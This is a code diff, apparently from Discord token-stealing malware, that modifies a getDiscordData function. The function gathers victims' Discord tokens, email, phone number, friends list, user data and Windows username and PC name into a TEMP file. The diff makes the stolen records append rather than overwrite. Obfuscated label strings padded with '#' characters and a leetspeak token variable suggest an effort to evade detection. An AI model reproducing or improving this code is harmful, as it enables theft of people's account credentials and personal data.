@@ -266,6 +266,8 @@ def getDiscordData():
 		working_ids = []
 		pc_username = os.getenv("UserName")
 		pc_name = os.getenv("COMPUTERNAME")
+		with open(f"{temp}\\discordinfo.txt", "w") as f:
+			f.write("")
 
 		for platform, path in PATHS.items():
 			if not os.path.exists(path):
@@ -294,9 +296,8 @@ def getDiscordData():
 				nitro = bool(user_data.get("premium_type"))
 				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
 				info = info.replace("#", "")
-				temp = os.getenv("TEMP")
-				with open(f"{temp}\\discordinfo.txt", "w") as f:
-					f.write(info)
+				with open(f"{temp}\\discordinfo.txt", "a") as f:
+					f.write(info + "\n")
 				f.close()
 
 	main()
